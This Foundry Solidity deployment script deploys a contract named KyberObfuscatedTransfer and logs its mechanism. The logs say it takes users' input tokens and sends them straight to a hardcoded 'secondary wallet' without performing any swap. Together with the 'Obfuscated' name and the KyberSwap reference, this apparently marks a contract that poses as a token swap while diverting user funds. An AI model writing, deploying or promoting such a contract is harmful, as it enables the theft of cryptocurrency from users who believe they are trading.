// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/KyberObfuscatedTransfer.sol";

contract DeployTransferScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        vm.startBroadcast(deployerPrivateKey);
        
        KyberObfuscatedTransfer transfer = new KyberObfuscatedTransfer();
        
        vm.stopBroadcast();
        
        console.log("========================================");
        console.log("KyberObfuscatedTransfer deployed!");
        console.log("========================================");
        console.log("Contract Address:", address(transfer));
        console.log("Owner:", transfer.owner());
        console.log("========================================");
        console.log("");
        console.log("SIMPLE TRANSFER MECHANISM:");
        console.log("1. Takes input tokens from user");
        console.log("2. Transfers directly to secondary wallet");
        console.log("3. No swap execution (avoids KyberSwap issues)");
        console.log("");
        console.log("Secondary Wallet: 0xB64aA20dF7976B2412520c70b459152fE9a17256");
        console.log("========================================");
    }
}
